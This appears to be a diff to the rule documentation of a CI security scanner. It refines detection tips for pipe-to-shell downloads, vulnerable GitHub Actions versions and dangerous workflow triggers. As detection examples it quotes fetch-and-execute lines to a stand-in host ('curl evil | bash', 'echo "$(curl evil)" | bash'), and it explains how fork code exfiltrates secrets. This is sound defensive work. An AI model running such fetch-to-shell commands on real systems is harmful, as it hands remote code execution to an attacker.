@@ -2272,6 +2272,7 @@ signature_verified:
         "The verification check itself ignores keywords inside quoted strings — `echo \"should sha256sum first\" && curl evil | bash` does NOT bypass detection.",
         "Pipe-to-shell substrings inside a quoted string (`echo \"Install with curl … | bash\"`) are documentation, not execution — they do not fire.",
         "Heredoc-to-shell with no download on the line (`cat <<EOF | bash`) is operator-authored, in-tree content. Any unsafe download inside the heredoc body still fires on its own script line.",
+        "A leading `echo`/`printf` piping a local variable into an interpreter (`echo \"$VAR\" | python3 -c …`) is in-pipeline data, not a download, so it does not fire. The exemption is voided by any `curl`/`wget`/`base64` anywhere on the line — including one hidden inside a quoted command substitution (`echo \"$(curl evil)\" | bash` still fires), so quoting a fetch does not evade the check.",
         "`trustedUrls` is host-precise: `https://example.com/*` does NOT match `https://evil.example.com/*`.",
         "Consider vendoring external scripts into your repository for full control over their content; use a trusted package manager (apt, brew, pip) instead of raw script downloads when possible.",
       ],
@@ -2358,6 +2359,7 @@ jobs:
         "`trustedUrls` is host-precise: `https://example.com/*` does NOT match `https://evil.example.com/*`.",
         "Pipe-to-shell substrings inside a quoted string (`echo \"Install with curl … | bash\"`) are documentation, not execution — they do not fire.",
         "Heredoc-to-shell with no download on the line (`cat <<EOF | bash`) is operator-authored, in-tree content. Any unsafe download inside the heredoc body still fires on its own script line.",
+        "A leading `echo`/`printf` piping in-workflow data into an interpreter (`echo \"$NEEDS_CONTEXT\" | python3 -c …`) is local data, not a download — it does not fire unless `curl`/`wget`/`base64` is also on the line.",
         "Inline payloads on `pull_request_target` workflows are especially dangerous — combine ISSUE-411 with ISSUE-802 (dangerous-triggers) for the full Megalodon defence.",
       ],
       relatedCodes: ["ISSUE-207", "ISSUE-802", "ISSUE-703"],
@@ -2879,7 +2881,7 @@ jobs:
       controlName: "Actions must not carry known CVEs",
       controlConfigKey: "actionsMustNotCarryKnownCVEs",
       description:
-        "A step-level `uses: owner/repo@ref` in committed workflow YAML matches a published GitHub Advisory Database entry for the `actions` ecosystem. Plumber queries `/advisories?ecosystem=actions&affects=<owner>/<repo>` once per `owner/repo` (cached). Exact tags (`@v4.1.0`) and SHA-resolved versions are point-checked against each advisory's `vulnerable_version_range`. Moving partial tags (`@v4`, `@v4.1`) are span-checked across the whole release series they can float across, so a partial tag is only reported when the **entire** span is vulnerable — `@v4` floating to `v4.3.0` does not match `>= 4.0.0, < 4.1.3`. Unresolvable commit SHAs may match any advisory for that repo (conservative). Requires `gh` / `GH_TOKEN`; without auth the control abstains.",
+        "A step-level `uses: owner/repo@ref` in committed workflow YAML matches a published GitHub Advisory Database entry for the `actions` ecosystem. Plumber queries `/advisories?ecosystem=actions&affects=<owner>/<repo>` once per `owner/repo` (cached). Exact tags (`@v4.1.0`) and SHA-resolved versions are point-checked against each advisory's `vulnerable_version_range`. Moving partial tags (`@v4`, `@v4.1`) are span-checked across the whole release series they can float across, so a partial tag is only reported when the **entire** span is vulnerable — `@v4` floating to `v4.3.0` does not match `>= 4.0.0, < 4.1.3`. A ref that cannot be resolved to a release version — a commit SHA with no matching release tag, or a mutable non-numeric tag such as `@rc` / `@main` / `@latest` — abstains and surfaces a 'could not verify' warning instead of matching every advisory for that repo. Requires `gh` / `GH_TOKEN`; without auth the control abstains.",
       impact:
         "A known-vulnerable action running in CI means the workflow inherits the published vulnerability class (RCE, secret exfiltration, privilege escalation, depending on the advisory). The blast radius is the union of the job's permissions and the secrets the workflow can read.",
       remediation:
@@ -2906,7 +2908,7 @@ github:
       goodExampleCaption: "Patched release pinned by SHA.",
       tips: [
         "Exact tags (`@v45.2.0`) and SHA-resolved versions are point-checked against the advisory range. Moving partial tags (`@v45`, `@v45.2`) are span-checked across the whole release series and only fire when the entire span is vulnerable.",
-        "SHA pins are resolved through the repo's tag list to the most specific tag that points at the commit, so a moving major alias never shadows the exact release. SHA pins without a resolvable release tag may flag if any advisory exists for that `owner/repo`.",
+        "SHA pins are resolved through the repo's tag list to the most specific tag that points at the commit, so a moving major alias never shadows the exact release. A SHA without a resolvable release tag (and mutable non-numeric tags like `@rc` / `@main`) abstains with a 'could not verify' warning rather than flagging every advisory for that `owner/repo`.",
         "Same scope limits as ISSUE-702: step `uses:` only, static YAML, no nested composite internals, no reusable-workflow callee files unless they live in this repo's `.github/workflows/`.",
         "Without API auth the rule abstains (not a pass). Pair with Dependabot `package-ecosystem: github-actions` for ongoing alerts.",
         "The PBOM tags affected includes with `hasCve: true` plus `advisories: [GHSA-…]` (JSON) / `plumber:has-cve` plus `plumber:advisories` properties (CycloneDX).",
@@ -3889,7 +3891,7 @@ jobs:
       controlName: "Workflow must not use dangerous triggers",
       controlConfigKey: "workflowMustNotUseDangerousTriggers",
       description:
-        "A job runs under a trigger that combines attacker-controlled input with the base repository's secrets — `workflow_run`, `issue_comment`, `pull_request_review`, `pull_request_review_comment`, `discussion`, `discussion_comment`, `gollum`, `fork` — **and checks out fork-controlled code** (an `actions/checkout` whose `ref:` is the workflow_run head or a PR-controlled ref). Untrusted code then executes with the base repo's secrets and GITHUB_TOKEN. The `pull_request_target` case is owned by [ISSUE-804](./ISSUE-804) (`pullRequestTargetMustNotCheckoutHead`), so this rule never fires on it — same exploit class, dedicated rule, no double-firing. Subscribing to such a trigger is **not** flagged on its own: labelling, milestone, comment and notification workflows legitimately need them and are safe without an untrusted checkout. The finding fires only on the exploitable combination, and abstains when a job-level `if:` restricts execution to same-repository pull requests.",
+        "A job runs under a trigger that combines attacker-controlled input with the base repository's secrets — `workflow_run`, `issue_comment`, `pull_request_review`, `pull_request_review_comment`, `discussion`, `discussion_comment`, `gollum`, `fork` — **and checks out fork-controlled code** (an `actions/checkout` whose `ref:` is the workflow_run head or a PR-controlled ref). Untrusted code then executes with the base repo's secrets and GITHUB_TOKEN. The `pull_request_target` case is owned by [ISSUE-804](./ISSUE-804) (`pullRequestTargetMustNotCheckoutHead`), so this rule never fires on it — same exploit class, dedicated rule, no double-firing. Subscribing to such a trigger is **not** flagged on its own: labelling, milestone, comment and notification workflows legitimately need them and are safe without an untrusted checkout. The finding fires only on the exploitable combination, and abstains when a job-level `if:` neutralises the risk — a same-repository pull-request guard, a `workflow_run` gated to an upstream push (`github.event.workflow_run.event == 'push'`), or a trusted `author_association` allowlist.",
       impact:
         "This is the same exploit class as the March 2025 tj-actions/changed-files vector (CVE-2025-30066) that exfiltrated secrets from hundreds of projects including aquasecurity/trivy. Once fork code runs with the base repo's secrets, every shell step is a direct exfiltration path — `npm install` (runs package scripts), `pytest` (loads conftest.py), even `cat README.md` (via attacker-supplied content). The blast radius is the union of the job's permissions and every secret the workflow can read.",
       remediation:
@@ -3931,7 +3933,7 @@ github:
       goodExampleCaption: "The `if:` blocks fork-originated runs entirely; only same-repository commits ever reach the checkout.",
       tips: [
         "The `pull_request_target` exploit pattern is owned by ISSUE-804 (pullRequestTargetMustNotCheckoutHead) — this rule excludes it to avoid double-firing on the same job.",
-        "Recognised fork guards: `head.repo.full_name == github.repository`, `head.repo.fork == false`, `head.repo.fork != true`, `!github.event.pull_request.head.repo.fork`.",
+        "Recognised guards: same-repository (`head.repo.full_name == github.repository`, `head.repo.fork == false`, `head.repo.fork != true`, `!github.event.pull_request.head.repo.fork`); a `workflow_run` restricted to an upstream push (`github.event.workflow_run.event == 'push'`); and a trusted `author_association` allowlist (`== 'OWNER' | 'MEMBER' | 'COLLABORATOR'`, or `contains(fromJSON('[…]'), …author_association)`). A negated check like `author_association != 'OWNER'` is a denylist, not a guard, and still fires.",
         "Recognised untrusted refs: `github.event.pull_request.head.sha`, `head.ref`, `github.head_ref`, `github.event.workflow_run.head_sha`, `head_branch`.",
         "Metadata-only jobs (labelling, milestone, comment reactions) under these triggers are safe and intentionally not flagged.",
         "Pair with ISSUE-305 for the environment-gate side of the same risk surface.",
